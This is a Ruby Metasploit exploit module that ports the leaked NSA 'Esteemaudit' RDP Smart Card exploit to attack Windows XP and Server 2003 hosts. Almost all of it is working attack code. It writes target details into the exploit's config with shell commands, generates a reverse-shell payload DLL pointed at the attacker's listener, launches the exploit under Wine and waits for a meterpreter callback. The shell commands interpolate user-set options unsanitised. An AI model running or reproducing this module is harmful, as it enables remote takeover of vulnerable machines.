require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Esteemaudit',
      'Description' => %q{
          This is a porting of the infamous Esteemaudit RDP Exploit leaked from Equationgroup (NSA).
	  The vulnerability exploited by this attack is related to Smart Card authentication used when 
	  logging onto the system via the RDP service. Systems affected are Windows Server 2003 SP1,SP2 
	  and Windows XP SP1, SP2, SP3. 
      },
      'Author'      =>
        [
          'Andrea Petralia',
          'Fulvio Zanetti',
	  'www.blackmath.it',
	  'info@blackmath.it'	  
        ],
		'Payload'        =>
        {
          'BadChars'   => "\x00\x0a\x0d",
        },
      'Platform'       => 'win',
      'DefaultTarget'  => 8,
      'Targets'        =>
        [
	  ['XPSP0         Windows XP SP0',{}],
	  ['XPSP1         Windows XP SP1',{}],
	  ['XPSP0|1       Windows XP SP0 or SP1',{}],
	  ['XPSP2         Windows XP SP2',{}],
          ['XPSP3         Windows XP SP3',{}],
	  ['XPSP2|3       Windows XP SP2 or SP3',{}],
	  ['W2K3SP0       Windows 2003 SP0',{}],
	  ['W2K3SP1       Windows 2003 SP1',{}],
	  ['W2K3SP2       Windows 2003 SP2',{}],
	  ['W2K3SP1|2     Windows 2003 SP1 or SP2',{}]
	],
      'Arch'           => [ARCH_X86,ARCH_X64],
	  'ExitFunc'	   => 'thread',
	  'Target'		   => 0,
      'License'     => MSF_LICENSE,
		)

		)

	register_options([
		OptEnum.new('TARGETARCHITECTURE', [true,'Target Architecture','x86',['x86','x86 64-bit']]),
		OptString.new('ESTEEMAUDITPATH',[true,'Path directory of Esteemaudit.exe','/usr/share/esteemaudit/']),
		OptString.new('RPORT',[true,'The RDP service port','3389']),
		OptString.new('WINEPATH',[true,'WINE drive_c path','/root/.wine/drive_c/'])
	], self.class)

  register_advanced_options([
    OptInt.new('TimeOut',[false,'Timeout for blocking network calls (in seconds)',5]),
    OptString.new('DLLName',[true,'DLL name for Esteemaudit','shell.dll'])
  ], self.class)

  end

  def exploit

  #Custom XML Esteemaudit
  print_status('Generating Esteemaudit XML data')
  cp = `cp #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.0.Skeleton.xml #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
  sed = `sed -i 's|%ESTEEMAUDITPATH%|#{datastore['ESTEEMAUDITPATH']}|' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
  sed = `sed -i 's|%WINEPATH%|#{datastore['WINEPATH']}|' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
  sed = `sed -i 's/%TARGETARCHITECTURE%/#{datastore['TARGETARCHITECTURE']}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
  
  if target.name =~ /Windows XP SP0/
	objective = "XPSP0"
  elsif target.name =~ /Windows XP SP1/
	objective = "XPSP1"
  elsif target.name =~ /Windows XP SP0 or SP1/
	objective = "XPSP0|1"
  elsif target.name =~ /Windows XP SP2/
	objective = "XPSP2"
  elsif target.name =~ /Windows XP SP3/
	objective = "XPSP3"
  elsif target.name =~ /Windows XP SP2 or SP3/
	objective = "XPSP2|3"
  elsif target.name =~ /Windows 2003 SP0/
	objective = "W2K3SP0"
  elsif target.name =~ /Windows 2003 SP1/
	objective = "W2K3SP1"
  elsif target.name =~ /Windows 2003 SP2/
	objective = "W2K3SP2"
  elsif target.name =~ /Windows 2003 SP1 or SP2/
	objective = "W2K3SP1|2"
  end
	
  sed = `sed -i 's/%TARGET%/#{objective}/' #{datastore['ESTEEMAUDITPATH']}/Esteemaudit-2.1.0.xml`
	
  
  dllpayload = datastore['WINEPATH'] + datastore['DLLName']
  
  #Generate DLL
  print_status("Generating payload DLL for Esteemaudit")
  pay = framework.modules.create(datastore['payload'])
  pay.datastore['LHOST'] = datastore['LHOST']
  pay.datastore['LPORT'] = datastore['LPORT']	  
  dll = pay.generate_simple({'Format'=>'dll'})
  File.open(datastore['WINEPATH']+datastore['DLLName'],'w') do |f|
	print_status("Writing DLL in #{dllpayload}")
	f.print dll
  end

  #Send Exploit + Payload Injection
  print_status('Launching Esteemaudit...')
  output = `cd #{datastore['ESTEEMAUDITPATH']}; wine Esteemaudit-2.1.0.exe 2>null &`
  if output =~ /Waiting for callback from second stage payload/
	print_good("We are inside, waiting for meterpreter... ")
  else
	print_error("The machine is not vulnerable!")
  end
  
  handler

 end

end





